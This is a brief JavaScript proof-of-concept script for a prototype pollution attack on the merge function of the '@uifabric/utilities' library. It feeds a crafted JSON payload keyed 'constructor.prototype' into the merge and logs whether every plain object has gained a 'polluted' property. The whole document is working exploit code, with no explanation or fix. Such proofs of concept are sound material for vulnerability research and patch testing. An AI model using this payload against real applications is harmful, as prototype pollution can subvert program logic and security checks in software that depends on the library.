var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const util = require('@uifabric/utilities');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
const source2 = { k3: {} };
console.log({}.polluted);
y = util.merge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);